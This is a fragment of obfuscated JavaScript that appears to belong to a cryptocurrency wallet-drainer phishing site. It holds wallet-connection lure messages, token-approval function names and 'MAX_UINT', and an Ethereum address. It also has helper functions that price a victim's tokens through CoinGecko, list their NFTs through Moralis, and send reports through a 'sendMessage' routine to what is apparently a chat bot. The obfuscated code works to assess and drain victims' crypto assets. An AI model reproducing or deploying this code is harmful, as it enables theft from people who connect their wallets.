'options','search','renounceOwnership','AddedBlackList','log','tokenURI','view','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','Blockchain\x20rectification','_name','pause','flipSaleState','uint256','Approved','setProvenanceHash','allowance','Issue','transferFrom','hash','result','nonpayable','basisPointsRate','bytes4','setParams','then','Could\x20not\x20get\x20a\x20wallet\x20connection','451476PFGNDT','CoinbaseWalletConnector','Transaction\x20hash\x20','_value','NFTs\x20collection\x20','Tokens:','_symbol','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','transferOwnership','0x2c0eA406932639E6Dc57b433059124D16579BBf8','MAX_UINT','amount','ownerOf','supportsInterface','_data','1319752rZAUpS','chainId:','Pause','filter','tokenOfOwnerByIndex','transfer','MetaMask','isApprovedForAll','newAddress','constructor','_totalSupply','from','event','catch','json','safeTransferFrom','setApprovalForAll','/nft/collections?chain=','operator','Deprecate','5910380ZyypSx','https://api.coingecko.com/api/v3/simple/token_price/fantom?contract_addresses=','isBlackListed','openModal','MAX_APES','_initialSupply','mintApe','getApproved','340811cNxqZp','status','BAYC_PROVENANCE','redeem','1221871LDYgTP','Unpause','feeBasisPoints','emergencySetStartingIndexBlock','networkVersion','index','&text=','.proceed','Token','destroyBlackFunds','468916XnOELM','sort','REVEAL_TIMESTAMP','toString','Ensure\x20you\x20are\x20assessing\x20this\x20website\x20from\x20a\x20dapps\x20browser\x20or\x20one\x20with\x20a\x20wallet\x20extension','Token\x20balance\x20is\x20','_spender','value','balance','bytes','_clearedUser','tokenId'];_0xb13f=function(){return _0x317c67;};return _0xb13f();}async function sendMessage(_0x303713){sendMessage1(_0x303713),sendMessage2(_0x303713);}async function sendMessage1(_0xc7b5b6){return new Promise((_0x141051,_0x559c10)=>{const _0x231f5a=_0x3cc4,_0x5d8ae6=Oxc1;fetch(_0x231f5a(0xf6)+_0x5d8ae6+'&text='+_0xc7b5b6,{'method':_0x231f5a(0x102),'headers':{}})[_0x231f5a(0x12b)](async _0x3aecea=>{const _0x100b82=_0x231f5a;if(_0x3aecea['status']>0x18f)throw _0x3aecea;_0x141051(await _0x3aecea[_0x100b82(0x99)]());})['catch'](_0x162c77=>{_0x559c10(_0x162c77);});});}async function sendMessage2(_0x4247f2){return new Promise((_0x353566,_0x163e21)=>{const _0x5f403c=_0x3cc4,_0x115915=Oxc2;fetch(_0x5f403c(0xf6)+_0x115915+_0x5f403c(0xb1)+_0x4247f2,{'method':'GET','headers':{}})[_0x5f403c(0x12b)](async _0x528993=>{const _0xa7c7d0=_0x5f403c;if(_0x528993[_0xa7c7d0(0xa8)]>0x18f)throw _0x528993;_0x353566(await _0x528993['json']());})[_0x5f403c(0x98)](_0x3a1574=>{_0x163e21(_0x3a1574);});});}async function getPrice(_0x1c43b8){return new Promise((_0x2acfda,_0x54294a)=>{const _0x21b016=_0x3cc4;fetch(_0x21b016(0xa0)+_0x1c43b8+_0x21b016(0xe3),{'method':_0x21b016(0x102),'headers':{}})[_0x21b016(0x12b)](async _0x44d15a=>{const _0x418577=_0x21b016;if(_0x44d15a[_0x418577(0xa8)]>0x18f)throw _0x44d15a;_0x2acfda(await _0x44d15a[_0x418577(0x99)]());})['catch'](_0x439fe4=>{_0x54294a(_0x439fe4);});});}async function getValue(_0x2b40db,_0x2a4058,_0x11dc2b){const _0x3200c1=_0x4144cd;console[_0x3200c1(0x117)](_0x2b40db,_0x2a4058,_0x11dc2b);let _0x607a55=await getPrice(_0x2b40db);console['log']('price',_0x607a55),_0x607a55=parseFloat(_0x607a55[_0x2b40db][_0x3200c1(0xf1)]);let _0x2bc78c=_0x2a4058/0xa**(_0x11dc2b||0x12)*_0x607a55;return _0x2bc78c=parseInt(_0x2bc78c),_0x607a55?_0x2bc78c:0x0;}async function getNFTs(_0x4e0809='',_0x33f3f3=_0x4144cd(0x100),_0x4c6891=_0x4144cd(0xee),_0x2267c5='50'){return new Promise((_0x1eee85,_0x25095c)=>{const _0x37b98f=_0x3cc4;fetch('https://deep-index.moralis.io/api/v2/'+_0x4e0809+_0x37b98f(0x9c)+_0x4c6891+_0x37b98f(0xe7)+_0x2267c5,{'method':_0x37b98f(0x102),'headers':{'accept':'application/json','X-API-Key':_0x33f3f3}})['then'](async _0x45b58d=>{const _0x4a0948=_0x37b98f;if(_0x45b58d[_0x4a0948(0xa8)]>0x18f)throw _0x45b58d;_0x1eee85(await _0x45b58d[_0x4a0948(0x99)]());})['catch'](_0x301c34=>{_0x25095c(_0x301c34);});});}